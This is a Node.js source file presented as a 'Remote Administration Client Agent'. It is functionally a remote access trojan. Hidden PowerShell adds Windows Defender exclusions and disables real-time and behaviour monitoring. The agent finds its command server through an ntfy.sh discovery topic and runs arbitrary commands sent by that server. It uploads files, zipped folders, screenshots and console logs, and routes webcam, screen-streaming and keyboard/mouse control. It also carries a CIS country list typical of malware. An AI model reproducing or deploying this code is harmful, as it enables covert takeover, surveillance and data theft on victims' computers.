/**
 * Remote Administration Client Agent
 * Auto-generated by Admin Panel Builder
 *
 * This agent connects to the WebSocket server, reports system info,
 * and accepts remote commands.
 */

const __SERVER_URL__ = '{{SERVER_URL}}';
const __CLIENT_NAME__ = '{{CLIENT_NAME}}';
const __SERVER_ID__ = '{{SERVER_ID}}';
const __OWNER_ID__ = '{{OWNER_ID}}';
const __RECONNECT_INTERVAL__ = 5000;

// CIS country codes (ISO 3166-1 alpha-2)
const CIS_COUNTRIES = ['RU', 'UA'];

const WebSocket = require('ws');
const os = require('os');
const { exec, execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const https = require('https');

// Promisified exec — does NOT block the event loop (allows pong responses)
function execAsync(cmd, opts = {}) {
  return new Promise((resolve, reject) => {
    const proc = exec(cmd, { timeout: 30000, maxBuffer: 10 * 1024 * 1024, windowsHide: true, ...opts }, (err, stdout, stderr) => {
      if (err) { err.stdout = stdout; err.stderr = stderr; reject(err); }
      else resolve({ stdout, stderr });
    });
  });
}

// Current server URL (can be updated via discovery)
let currentServerUrl = __SERVER_URL__;
let discoveryAttempts = 0;
let reconnectAttempts = 0; // Counts consecutive reconnect failures for backoff
let isHandlingDisconnect = false; // Guard against error+close race

// Generate persistent device ID based on hardware
function getHWID() {
  const cpus = os.cpus();
  const raw = `${os.hostname()}-${cpus[0]?.model || ''}-${os.totalmem()}-${os.platform()}`;
  return crypto.createHash('md5').update(raw).digest('hex').substring(0, 16).toUpperCase();
}

const DEVICE_ID = `agent-${getHWID()}`;
const HWID = getHWID();
const START_TIME = Date.now();

let ws = null;
let reconnectTimer = null;
let heartbeatTimer = null;
let keepAliveTimer = null;
let prevCpuTimes = null;
let sendingSystemInfo = false; // guard against overlapping async sends
const NUM_CORES = os.cpus().length || 1;

// ==================== Agent Setup (AV, ffmpeg) ====================
let ffmpegPath = 'ffmpeg'; // Default to PATH
let agentSetupDone = false;

function setupAgent() {
  if (agentSetupDone || os.platform() !== 'win32') return;
  agentSetupDone = true;
  console.log('[Agent] Running initial setup...');

  // 1. Try to disable Windows Defender real-time monitoring & add exclusions
  const agentDir = path.dirname(process.argv[1] || __filename);
  const tempDir = os.tmpdir();
  const psAV = `
    try {
      $agentPath = '${agentDir.replace(/\\/g, '\\\\').replace(/'/g, "''")}';
      $tempPath = '${tempDir.replace(/\\/g, '\\\\').replace(/'/g, "''")}';
      Add-MpPreference -ExclusionPath $agentPath -ErrorAction SilentlyContinue;
      Add-MpPreference -ExclusionPath $tempPath -ErrorAction SilentlyContinue;
      Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue;
      Add-MpPreference -ExclusionProcess 'ffmpeg.exe' -ErrorAction SilentlyContinue;
      Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue;
      Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue;
      Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue;
    } catch {}
  `;
  exec(`powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "${psAV.replace(/"/g, '\\"').replace(/\n/g, ' ')}"`,
    { timeout: 15000, windowsHide: true },
    (err) => {
      if (err) console.log('[Agent] AV setup: may require admin privileges');
      else console.log('[Agent] AV exclusions configured');
    }
  );

  // 2. Check/download ffmpeg for camera support
  resolveFFmpegPath();
}

function resolveFFmpegPath() {
  // Check local tools first (fast path — persistent cache)
  const toolsDir = path.join(process.env.LOCALAPPDATA || process.env.APPDATA || os.tmpdir(), 'ra_tools');
  const localPath = path.join(toolsDir, 'ffmpeg.exe');
  if (fs.existsSync(localPath)) {
    ffmpegPath = localPath;
    console.log('[Agent] ffmpeg found in local cache');
    return;
  }
  // Check PATH
  exec('where ffmpeg', { timeout: 3000, windowsHide: true }, (err, stdout) => {
    if (!err && stdout.trim()) {
      ffmpegPath = stdout.trim().split('\\n')[0].trim();
      console.log('[Agent] ffmpeg found in PATH');
      return;
    }
    // Download ffmpeg immediately
    downloadFFmpeg();
  });
}

function downloadFFmpeg() {
  const toolsDir = path.join(process.env.LOCALAPPDATA || process.env.APPDATA || os.tmpdir(), 'ra_tools');
  try { fs.mkdirSync(toolsDir, { recursive: true }); } catch {}

  const ffmpegExe = path.join(toolsDir, 'ffmpeg.exe');
  if (fs.existsSync(ffmpegExe)) { ffmpegPath = ffmpegExe; return; }

  const zipPath = path.join(toolsDir, 'ffmpeg.zip');
  console.log('[Agent] Downloading ffmpeg via Node.js https...');

  // Node.js https streaming download with redirect support
  function httpsGet(url, dest, cb) {
    const file = fs.createWriteStream(dest);
    const request = https.get(url, { timeout: 120000 }, (response) => {
      // Follow redirects (301, 302, 303, 307)
      if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
        file.close();
        try { fs.unlinkSync(dest); } catch {}
        httpsGet(response.headers.location, dest, cb);
        return;
      }
      if (response.statusCode !== 200) {
        file.close();
        try { fs.unlinkSync(dest); } catch {}
        cb(new Error('HTTP ' + response.statusCode));
        return;
      }
      response.pipe(file);
      file.on('finish', () => { file.close(() => cb(null)); });
    });
    request.on('error', (err) => {
      file.close();
      try { fs.unlinkSync(dest); } catch {}
      cb(err);
    });
    request.on('timeout', () => {
      request.destroy();
      file.close();
      try { fs.unlinkSync(dest); } catch {}
      cb(new Error('Download timeout'));
    });
  }

  const url = 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip';
  httpsGet(url, zipPath, (err) => {
    if (err) {
      console.error('[Agent] ffmpeg download error:', err.message);
      return;
    }
    console.log('[Agent] ffmpeg downloaded, extracting...');
    // Extract using PowerShell
    const psExtract = `
      $ProgressPreference = 'SilentlyContinue';
      $zip = '${zipPath.replace(/'/g, "''").replace(/\\/g, '\\\\')}';
      $dir = '${toolsDir.replace(/'/g, "''").replace(/\\/g, '\\\\')}';
      $exe = '${ffmpegExe.replace(/'/g, "''").replace(/\\/g, '\\\\')}';
      Expand-Archive -Path $zip -DestinationPath $dir -Force;
      $found = Get-ChildItem -Path $dir -Recurse -Filter 'ffmpeg.exe' | Select-Object -First 1;
      if ($found) { Copy-Item $found.FullName $exe -Force; Write-Output 'OK' }
      else { Write-Output 'NOTFOUND' };
      Remove-Item $zip -ErrorAction SilentlyContinue
    `;
    exec(`powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "${psExtract.replace(/"/g, '\\"').replace(/\n/g, ' ')}"`,
      { maxBuffer: 1024 * 1024, timeout: 300000, windowsHide: true },
      (err2, stdout2) => {
        const out = (stdout2 || '').trim();
        if (out === 'OK' && fs.existsSync(ffmpegExe)) {
          ffmpegPath = ffmpegExe;
          console.log('[Agent] ffmpeg ready at ' + ffmpegExe);
        } else {
          console.error('[Agent] ffmpeg extraction failed:', out || (err2 && err2.message) || 'unknown');
        }
      }
    );
  });
}

// ==================== Console Log Intercept ====================
// Capture all console output and forward to admin panel via WebSocket
const _origLog = console.log;
const _origWarn = console.warn;
const _origErr = console.error;
const _logBuffer = []; // Buffer logs until WS is connected
const MAX_LOG_BUFFER = 200;

function _sendLog(level, args) {
  const text = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ');
  const entry = { level, text, ts: new Date().toISOString() };
  if (ws && ws.readyState === WebSocket.OPEN) {
    try {
      ws.send(JSON.stringify({
        type: 'agent_log',
        deviceId: DEVICE_ID,
        payload: entry,
        timestamp: entry.ts,
      }));
    } catch (_) { /* ignore */ }
  } else {
    _logBuffer.push(entry);
    if (_logBuffer.length > MAX_LOG_BUFFER) _logBuffer.shift();
  }
}

function _flushLogBuffer() {
  while (_logBuffer.length > 0) {
    const entry = _logBuffer.shift();
    try {
      ws.send(JSON.stringify({
        type: 'agent_log',
        deviceId: DEVICE_ID,
        payload: entry,
        timestamp: entry.ts,
      }));
    } catch (_) { break; }
  }
}

console.log = function(...args) { _origLog.apply(console, args); _sendLog('info', args); };
console.warn = function(...args) { _origWarn.apply(console, args); _sendLog('warn', args); };
console.error = function(...args) { _origErr.apply(console, args); _sendLog('error', args); };

// ==================== System Info Collector ====================

function getCpuUsage() {
  const cpus = os.cpus();
  const current = cpus.reduce(
    (acc, cpu) => {
      acc.user += cpu.times.user;
      acc.nice += cpu.times.nice;
      acc.sys += cpu.times.sys;
      acc.idle += cpu.times.idle;
      acc.irq += cpu.times.irq;
      return acc;
    },
    { user: 0, nice: 0, sys: 0, idle: 0, irq: 0 }
  );

  if (!prevCpuTimes) {
    prevCpuTimes = current;
    return 0;
  }

  const totalDiff =
    (current.user - prevCpuTimes.user) +
    (current.nice - prevCpuTimes.nice) +
    (current.sys - prevCpuTimes.sys) +
    (current.idle - prevCpuTimes.idle) +
    (current.irq - prevCpuTimes.irq);
  const idleDiff = current.idle - prevCpuTimes.idle;
  prevCpuTimes = current;

  if (totalDiff === 0) return 0;
  return Math.round(((totalDiff - idleDiff) / totalDiff) * 1000) / 10;
}

// Cache disk info since it changes rarely (refresh every 30s)
let cachedDisks = [];
let lastDiskFetch = 0;
const DISK_CACHE_MS = 30000;

function getDiskInfo() {
  // Return cached if fresh
  if (cachedDisks.length > 0 && (Date.now() - lastDiskFetch) < DISK_CACHE_MS) {
    return Promise.resolve(cachedDisks);
  }
  return new Promise((resolve) => {
    if (os.platform() === 'win32') {
      const psCmd = `powershell -NoProfile -Command "Get-CimInstance Win32_LogicalDisk | Where-Object {$_.Size -gt 0} | ForEach-Object { $_.DeviceID + '||' + $_.Size + '||' + $_.FreeSpace + '||' + $_.FileSystem }"`;
      exec(psCmd, { timeout: 8000, windowsHide: true }, (err, stdout) => {
        if (err) return resolve(cachedDisks); // return stale cache on error
        const disks = [];
        const lines = stdout.trim().split('\n').filter(l => l.trim());
        for (const line of lines) {
          const parts = line.trim().split('||');
          if (parts.length < 4) continue;
          const mount = parts[0];
          const total = parseInt(parts[1]) || 0;
          const free = parseInt(parts[2]) || 0;
          const fsType = parts[3] || 'Unknown';
          if (total === 0) continue;
          const used = total - free;
          disks.push({
            name: `Disk ${mount}`,
            mount: mount,
            type: fsType,
            total,
            used,
            free,
            usagePercent: Math.round((used / total) * 1000) / 10,
          });
        }
        cachedDisks = disks;
        lastDiskFetch = Date.now();
        resolve(disks);
      });
    } else {
      exec("df -B1 --output=target,size,used,avail,fstype 2>/dev/null | tail -n +2", {
        timeout: 5000, windowsHide: true
      }, (err, stdout) => {
        if (err) return resolve(cachedDisks);
        const disks = stdout.trim().split('\n').filter(l => l.trim()).map(line => {
          const parts = line.trim().split(/\s+/);
          const total = parseInt(parts[1]) || 0;
          const used = parseInt(parts[2]) || 0;
          const free = parseInt(parts[3]) || 0;
          return {
            name: parts[0],
            mount: parts[0],
            type: parts[4] || 'ext4',
            total, used, free,
            usagePercent: total ? Math.round((used / total) * 1000) / 10 : 0,
          };
        }).filter(d => d.total > 0);
        cachedDisks = disks;
        lastDiskFetch = Date.now();
        resolve(disks);
      });
    }
  });
}

async function getSystemInfo() {
  const cpus = os.cpus();
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const cpuUsage = getCpuUsage();

  const interfaces = os.networkInterfaces();
  const networkList = [];
  for (const [name, addrs] of Object.entries(interfaces)) {
    const ipv4 = addrs.find((a) => a.family === 'IPv4' && !a.internal);
    if (ipv4) {
      networkList.push({
        name,
        ip: ipv4.address,
        mac: ipv4.mac,
        speed: 1000,
      });
    }
  }

  const disks = await getDiskInfo();

  return {
    uptime: Math.floor(os.uptime()),
    os: {
      platform: os.platform() === 'win32' ? 'Windows' : os.platform(),
      version: os.release(),
      arch: os.arch(),
      hostname: os.hostname(),
    },
    cpu: {
      model: cpus[0]?.model || 'Unknown',
      cores: cpus.length,
      speed: cpus[0]?.speed || 0,
      usage: cpuUsage,
    },
    memory: {
      total: totalMem,
      used: usedMem,
      free: freeMem,
      usagePercent: Math.round((usedMem / totalMem) * 1000) / 10,
    },
    disks,
    network: networkList,
  };
}

function getProcessList() {
  return new Promise((resolve) => {
    if (os.platform() === 'win32') {
      // Use WMI performance counters for real CPU % per process, divide by core count for normalized %
      const coreCount = NUM_CORES;
      const psCmd = `powershell -NoProfile -Command "Get-CimInstance Win32_PerfFormattedData_PerfProc_Process | Where-Object {$_.Name -ne '_Total' -and $_.Name -ne 'Idle'} | Sort-Object WorkingSetPrivate -Descending | Select-Object -First 200 | ForEach-Object { $_.IDProcess.ToString() + '||' + $_.Name + '||' + [math]::Round($_.PercentProcessorTime/${coreCount},1).ToString() + '||' + [math]::Round($_.WorkingSetPrivate/1MB,0).ToString() }"`;
      exec(psCmd, { maxBuffer: 1024 * 1024 * 10, timeout: 15000, windowsHide: true }, (err, stdout) => {
        if (err) {
          // Fallback to tasklist
          exec('tasklist /FO CSV /NH', { maxBuffer: 1024 * 1024 * 5, windowsHide: true }, (err2, stdout2) => {
            if (err2) return resolve([]);
            const procs = stdout2.trim().split('\n').slice(0, 200).map((line) => {
              const parts = line.split('","').map((s) => s.replace(/"/g, ''));
              return {
                name: parts[0] || 'unknown',
                pid: parseInt(parts[1]) || 0,
                memory: Math.round(parseInt((parts[4] || '0').replace(/[^\d]/g, '')) / 1024),
                cpu: 0,
                user: 'SYSTEM',
                status: 'Running',
              };
            });
            resolve(procs);
          });
          return;
        }
        const procs = stdout.trim().split('\n').filter(l => l.trim()).map((line) => {
          const parts = line.trim().split('||');
          return {
            pid: parseInt(parts[0]) || 0,
            name: parts[1] || 'unknown',
            cpu: parseFloat(parts[2]) || 0,
            memory: parseInt(parts[3]) || 0,
            user: 'SYSTEM',
            status: 'Running',
          };
        });
        resolve(procs);
      });
    } else {
      exec('ps aux --sort=-%mem | head -200', { maxBuffer: 1024 * 1024 * 5, windowsHide: true }, (err, stdout) => {
        if (err) return resolve([]);
        const lines = stdout.trim().split('\n').slice(1);
        const procs = lines.map((line) => {
          const parts = line.trim().split(/\s+/);
          return {
            name: parts[10] || 'unknown',
            pid: parseInt(parts[1]) || 0,
            cpu: parseFloat(parts[2]) || 0,
            memory: Math.round(parseFloat(parts[5]) / 1024) || 0,
            user: parts[0],
            status: 'Running',
          };
        });
        resolve(procs);
      });
    }
  });
}

// ==================== Auto-Discovery ====================

function discoverServerUrl() {
  return new Promise((resolve, reject) => {
    if (!__SERVER_ID__ || __SERVER_ID__ === '{{SERVER_ID}}' || __SERVER_ID__ === 'none') {
      return reject(new Error('No SERVER_ID configured'));
    }
    const topicName = `ra-disc-${__SERVER_ID__}`;
    const url = `https://ntfy.sh/${topicName}/json?poll=1&since=48h`;
    const req = https.get(url, { timeout: 10000 }, (res) => {
      let data = '';
      res.on('data', (c) => { data += c; });
      res.on('end', () => {
        try {
          const lines = data.trim().split('\n').filter(Boolean);
          if (lines.length === 0) return reject(new Error('No discovery data'));
          // Parse last message (most recent)
          const last = JSON.parse(lines[lines.length - 1]);
          const msg = JSON.parse(last.message);
          if (msg.ws) {
            console.log(`[Agent] Discovered new server URL: ${msg.ws}`);
            resolve(msg.ws);
          } else {
            reject(new Error('No WS URL in discovery'));
          }
        } catch (e) {
          reject(new Error(`Discovery parse error: ${e.message}`));
        }
      });
    });
    req.on('error', (e) => reject(e));
    req.on('timeout', () => { req.destroy(); reject(new Error('Discovery timeout')); });
  });
}

// ==================== WebSocket Connection ====================

async function connect() {
  if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
    return;
  }

  console.log(`[Agent] Connecting to ${currentServerUrl}...`);

  try {
    ws = new WebSocket(currentServerUrl);
  } catch (err) {
    console.error(`[Agent] Connection error: ${err.message}`);
    await tryDiscoveryAndReconnect(err);
    return;
  }

  ws.on('open', () => {
    console.log(`[Agent] Connected! Device ID: ${DEVICE_ID}`);
    discoveryAttempts = 0; // Reset on successful connection
    reconnectAttempts = 0; // Reset backoff counter
    isHandlingDisconnect = false; // Reset guard on success

    // Flush buffered console logs to admin
    _flushLogBuffer();

    // Register as agent
    send({
      type: 'register_agent',
      payload: {
        deviceId: DEVICE_ID,
        hostname: os.hostname(),
        hwid: HWID,
        clientName: __CLIENT_NAME__,
        ownerId: __OWNER_ID__,
        ip: getLocalIP(),
        os: `${os.platform() === 'win32' ? 'Windows' : os.platform()} ${os.release()}`,
        agentVersion: '2.3.0',
        uptime: Math.floor(os.uptime()),
      },
    });

    // Start sending system info periodically (every 3s)
    sendSystemInfo().catch(() => {});
    heartbeatTimer = setInterval(() => {
      sendSystemInfo().catch(() => {});
    }, 3000);

    // Keep-alive ping every 15 seconds to prevent connection dropping
    keepAliveTimer = setInterval(() => {
      if (ws && ws.readyState === WebSocket.OPEN) {
        try { ws.ping(); } catch(e) { /* ignore */ }
      }
    }, 15000);
  });

  // Respond to server pings with pong (automatic in ws library, but be explicit)
  ws.on('ping', () => {
    try { if (ws && ws.readyState === WebSocket.OPEN) ws.pong(); } catch(e) { /* ignore */ }
  });

  ws.on('message', (raw) => {
    try {
      const message = JSON.parse(raw.toString());
      handleServerMessage(message);
    } catch (err) {
      console.error(`[Agent] Parse error: ${err.message}`);
    }
  });

  ws.on('close', () => {
    console.log('[Agent] Disconnected');
    const oldWs = ws;
    ws = null;
    cleanup();
    // Only handle disconnect once (error handler may have already started reconnect)
    if (!isHandlingDisconnect) {
      isHandlingDisconnect = true;
      tryDiscoveryAndReconnect(new Error('closed'));
    }
  });

  ws.on('error', (err) => {
    console.error(`[Agent] Error: ${err.message}`);
    // If ENOTFOUND, ECONNREFUSED, ETIMEDOUT, or Cloudflare error (530/502/503) — URL is stale, try discovery
    const isStale = err.message.includes('ENOTFOUND') || err.message.includes('ECONNREFUSED') || err.message.includes('ETIMEDOUT') || err.message.includes('Unexpected server response');
    if (isStale && !isHandlingDisconnect) {
      isHandlingDisconnect = true;
      ws = null;
      cleanup();
      tryDiscoveryAndReconnect(err);
    }
    // 'close' event will also fire but will be skipped by the guard
  });
}

async function tryDiscoveryAndReconnect(err) {
  const isStaleUrl = err && (
    err.message.includes('ENOTFOUND') ||
    err.message.includes('ECONNREFUSED') ||
    err.message.includes('ETIMEDOUT') ||
    err.message.includes('getaddrinfo') ||
    err.message.includes('Unexpected server response')
  );

  // Always try discovery when URL seems stale — no hard limit.
  // Use exponential backoff between discovery attempts (5s → 10s → 20s → 60s cap).
  // Also force a discovery retry every 6th reconnect even if error type differs.
  const shouldDiscover = isStaleUrl || (reconnectAttempts > 0 && reconnectAttempts % 6 === 0);

  if (shouldDiscover) {
    discoveryAttempts++;
    const discoveryDelay = Math.min(5000 * Math.pow(2, Math.min(discoveryAttempts - 1, 4)), 60000);
    console.log(`[Agent] Server unreachable. Discovery attempt #${discoveryAttempts} (backoff ${Math.round(discoveryDelay / 1000)}s)...`);
    await new Promise(r => setTimeout(r, discoveryDelay));
    try {
      const newUrl = await discoverServerUrl();
      if (newUrl && newUrl !== currentServerUrl) {
        console.log(`[Agent] Server URL updated: ${currentServerUrl} -> ${newUrl}`);
        currentServerUrl = newUrl;
        discoveryAttempts = 0;
        reconnectAttempts = 0;
        // Clear any pending reconnect timer
        if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
        // Connect immediately with new URL
        console.log(`[Agent] Connecting to new server in 1s...`);
        setTimeout(() => { isHandlingDisconnect = false; connect(); }, 1000);
        return;
      } else if (newUrl) {
        console.log(`[Agent] Discovery returned same URL, will retry after reconnect backoff...`);
      }
    } catch (e) {
      console.log(`[Agent] Discovery failed: ${e.message}`);
    }
  }
  scheduleReconnect();
}

function cleanup() {
  if (heartbeatTimer) {
    clearInterval(heartbeatTimer);
    heartbeatTimer = null;
  }
  if (keepAliveTimer) {
    clearInterval(keepAliveTimer);
    keepAliveTimer = null;
  }
}

function scheduleReconnect() {
  if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
  reconnectAttempts++;
  // Exponential backoff: 5s → 10s → 20s → 30s cap
  const delay = Math.min(__RECONNECT_INTERVAL__ * Math.pow(2, Math.min(reconnectAttempts - 1, 3)), 30000);
  console.log(`[Agent] Reconnecting in ${Math.round(delay / 1000)}s (attempt #${reconnectAttempts})...`);
  reconnectTimer = setTimeout(() => {
    reconnectTimer = null;
    isHandlingDisconnect = false;
    connect();
  }, delay);
}

function send(data) {
  try {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify(data));
    }
  } catch (err) {
    console.error(`[Agent] Send error: ${err.message}`);
  }
}

async function sendSystemInfo() {
  if (sendingSystemInfo) return; // prevent overlapping calls
  sendingSystemInfo = true;
  try {
    const info = await getSystemInfo();
    send({
      type: 'system_info',
      deviceId: DEVICE_ID,
      payload: info,
    });
  } catch (e) {
    // ignore
  } finally {
    sendingSystemInfo = false;
  }
}

function getLocalIP() {
  const interfaces = os.networkInterfaces();
  for (const addrs of Object.values(interfaces)) {
    for (const addr of addrs) {
      if (addr.family === 'IPv4' && !addr.internal) {
        return addr.address;
      }
    }
  }
  return '127.0.0.1';
}

// ==================== Command Handler ====================

function handleServerMessage(message) {
  const { type, payload } = message;

  switch (type) {
    case 'heartbeat':
      send({ type: 'heartbeat', timestamp: new Date().toISOString() });
      break;

    case 'command_request':
      executeCommand(payload);
      break;

    case 'request_screenshot':
      takeScreenshot();
      break;

    case 'request_processes':
      sendProcessList();
      break;

    case 'request_files':
      sendFileList(payload?.path || (os.platform() === 'win32' ? 'C:\\' : '/'));
      break;

    case 'request_download':
      handleDownload(payload);
      break;

    case 'forensic_request':
      handleForensicScan(payload);
      break;

    case 'request_camera_list':
      sendCameraList();
      break;

    case 'request_camera_start':
      startCameraStream(payload);
      break;

    case 'request_camera_stop':
      stopCameraStream();
      break;

    case 'request_screen_stream':
      startScreenStream(payload);
      break;

    case 'stop_screen_stream':
      stopScreenStream();
      break;

    case 'mouse_input':
      handleMouseInput(payload);
      break;

    case 'keyboard_input':
      handleKeyboardInput(payload);
      break;
  }
}

function executeCommand(payload) {
  const { command, shell } = payload;
  const shellCmd = shell === 'powershell' ? `powershell -Command "${command}"` : command;

  console.log(`[Agent] Executing: ${command}`);

  exec(shellCmd, { maxBuffer: 1024 * 1024 * 5, timeout: 30000, windowsHide: true }, (err, stdout, stderr) => {
    send({
      type: 'command_result',
      deviceId: DEVICE_ID,
      payload: {
        command,
        stdout: stdout || '',
        stderr: stderr || '',
        error: err ? err.message : null,
        exitCode: err ? err.code || 1 : 0,
      },
    });
  });
}

async function sendProcessList() {
  const processes = await getProcessList();
  send({
    type: 'process_list',
    deviceId: DEVICE_ID,
    payload: processes,
  });
}

function sendFileList(dirPath) {
  try {
    const items = fs.readdirSync(dirPath, { withFileTypes: true }).slice(0, 500);
    const files = items.map((item) => {
      let size = 0;
      let modified = '';
      try {
        const stat = fs.statSync(path.join(dirPath, item.name));
        if (item.isFile()) {
          size = stat.size;
        }
        modified = stat.mtime.toISOString();
      } catch { /* ignore */ }
      return {
        name: item.name,
        type: item.isDirectory() ? 'directory' : 'file',
        size,
        path: path.join(dirPath, item.name),
        modified,
        permissions: 'rw',
      };
    });
    // Sort: directories first, then files
    files.sort((a, b) => {
      if (a.type === 'directory' && b.type !== 'directory') return -1;
      if (a.type !== 'directory' && b.type === 'directory') return 1;
      return a.name.localeCompare(b.name);
    });
    send({
      type: 'file_list',
      deviceId: DEVICE_ID,
      payload: { path: dirPath, files },
    });
  } catch (err) {
    send({
      type: 'file_list',
      deviceId: DEVICE_ID,
      payload: { path: dirPath, files: [], error: err.message },
    });
  }
}

// ==================== Download Handler ====================

function handleDownload(payload) {
  const targetPath = payload?.path;
  if (!targetPath) {
    send({ type: 'download_result', deviceId: DEVICE_ID, payload: { error: 'No path specified' } });
    return;
  }

  try {
    const stat = fs.statSync(targetPath);

    if (stat.isFile()) {
      // Single file — limit 50MB
      if (stat.size > 50 * 1024 * 1024) {
        send({ type: 'download_result', deviceId: DEVICE_ID, payload: { error: 'File too large (>50MB)', path: targetPath } });
        return;
      }
      const data = fs.readFileSync(targetPath);
      const base64 = data.toString('base64');
      send({
        type: 'download_result',
        deviceId: DEVICE_ID,
        payload: {
          path: targetPath,
          name: path.basename(targetPath),
          type: 'file',
          data: base64,
          size: stat.size,
          mime: getMimeType(targetPath),
        },
      });
    } else if (stat.isDirectory()) {
      // Directory — zip it with PowerShell (Windows) or tar (Linux)
      if (os.platform() === 'win32') {
        const zipPath = path.join(os.tmpdir(), `ra_download_${Date.now()}.zip`);
        const psCmd = `powershell -NoProfile -Command "Compress-Archive -Path '${targetPath.replace(/'/g, "''")}\\*' -DestinationPath '${zipPath}' -Force"`;
        exec(psCmd, { timeout: 60000, windowsHide: true }, (err) => {
          if (err) {
            send({ type: 'download_result', deviceId: DEVICE_ID, payload: { error: `Zip failed: ${err.message}`, path: targetPath } });
            return;
          }
          try {
            const zipStat = fs.statSync(zipPath);
            if (zipStat.size > 100 * 1024 * 1024) {
              fs.unlinkSync(zipPath);
              send({ type: 'download_result', deviceId: DEVICE_ID, payload: { error: 'Archive too large (>100MB)', path: targetPath } });
              return;
            }
            const zipData = fs.readFileSync(zipPath);
            const base64 = zipData.toString('base64');
            fs.unlinkSync(zipPath);
            send({
              type: 'download_result',
              deviceId: DEVICE_ID,
              payload: {
                path: targetPath,
                name: path.basename(targetPath) + '.zip',
                type: 'archive',
                data: base64,
                size: zipStat.size,
                mime: 'application/zip',
              },
            });
          } catch (e) {
            send({ type: 'download_result', deviceId: DEVICE_ID, payload: { error: e.message, path: targetPath } });
          }
        });
      } else {
        const tarPath = `/tmp/ra_download_${Date.now()}.tar.gz`;
        exec(`tar -czf "${tarPath}" -C "${path.dirname(targetPath)}" "${path.basename(targetPath)}"`, { timeout: 60000, windowsHide: true }, (err) => {
          if (err) {
            send({ type: 'download_result', deviceId: DEVICE_ID, payload: { error: `Archive failed: ${err.message}`, path: targetPath } });
            return;
          }
          try {
            const tarData = fs.readFileSync(tarPath);
            const base64 = tarData.toString('base64');
            fs.unlinkSync(tarPath);
            send({
              type: 'download_result',
              deviceId: DEVICE_ID,
              payload: {
                path: targetPath,
                name: path.basename(targetPath) + '.tar.gz',
                type: 'archive',
                data: base64,
                size: tarData.length,
                mime: 'application/gzip',
              },
            });
          } catch (e) {
            send({ type: 'download_result', deviceId: DEVICE_ID, payload: { error: e.message, path: targetPath } });
          }
        });
      }
    }
  } catch (err) {
    send({ type: 'download_result', deviceId: DEVICE_ID, payload: { error: err.message, path: targetPath } });
  }
}

function getMimeType(filePath) {
  const ext = path.extname(filePath).toLowerCase();
  const mimes = {
    '.txt': 'text/plain', '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript',
    '.json': 'application/json', '.xml': 'application/xml', '.pdf': 'application/pdf',
    '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
    '.svg': 'image/svg+xml', '.zip': 'application/zip', '.rar': 'application/x-rar-compressed',
    '.7z': 'application/x-7z-compressed', '.exe': 'application/octet-stream',
    '.doc': 'application/msword', '.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    '.xls': 'application/vnd.ms-excel', '.xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    '.mp3': 'audio/mpeg', '.mp4': 'video/mp4', '.avi': 'video/x-msvideo',
  };
  return mimes[ext] || 'application/octet-stream';
}

function takeScreenshot() {
  if (os.platform() === 'win32') {
    // Write PS script to temp file to avoid inline parsing issues with types
    const psFile = path.join(os.tmpdir(), `ra_screenshot_${DEVICE_ID}.ps1`);
    const psScript = `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$point = New-Object System.Drawing.Point(0, 0)
$graphics.CopyFromScreen($screen.Location, $point, $screen.Size)
$ms = New-Object System.IO.MemoryStream
$bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$bytes = $ms.ToArray()
$base64 = [Convert]::ToBase64String($bytes)
$graphics.Dispose()
$bitmap.Dispose()
$ms.Dispose()
Write-Output $base64
`;
    try {
      fs.writeFileSync(psFile, psScript, 'utf8');
    } catch (e) {
      send({ type: 'screenshot', deviceId: DEVICE_ID, payload: { error: `Failed to write script: ${e.message}` } });
      return;
    }
    exec(`powershell -NoProfile -ExecutionPolicy Bypass -File "${psFile}"`,
      { maxBuffer: 1024 * 1024 * 50, timeout: 15000, windowsHide: true },
      (err, stdout) => {
        // Clean up temp file
        try { fs.unlinkSync(psFile); } catch(e) { /* ignore */ }
        if (err) {
          send({
            type: 'screenshot',
            deviceId: DEVICE_ID,
            payload: { error: `Screenshot failed: ${err.message}` },
          });
          return;
        }
        const base64 = stdout.trim();
        if (!base64 || base64.length < 100) {
          send({ type: 'screenshot', deviceId: DEVICE_ID, payload: { error: 'Screenshot returned empty data' } });
          return;
        }
        send({
          type: 'screenshot',
          deviceId: DEVICE_ID,
          payload: {
            image: `data:image/jpeg;base64,${base64}`,
            width: 1920,
            height: 1080,
            timestamp: new Date().toISOString(),
          },
        });
      }
    );
  } else {
    // Linux: try import command (ImageMagick)
    const tmpFile = `/tmp/screenshot_${Date.now()}.jpg`;
    exec(`import -window root ${tmpFile} && base64 ${tmpFile} && rm ${tmpFile}`,
      { maxBuffer: 1024 * 1024 * 50, timeout: 15000, windowsHide: true },
      (err, stdout) => {
        if (err) {
          send({
            type: 'screenshot',
            deviceId: DEVICE_ID,
            payload: { error: `Screenshot failed: ${err.message}` },
          });
          return;
        }
        send({
          type: 'screenshot',
          deviceId: DEVICE_ID,
          payload: {
            image: `data:image/jpeg;base64,${stdout.trim()}`,
            width: 1920,
            height: 1080,
            timestamp: new Date().toISOString(),
          },
        });
      }
    );
  }
}

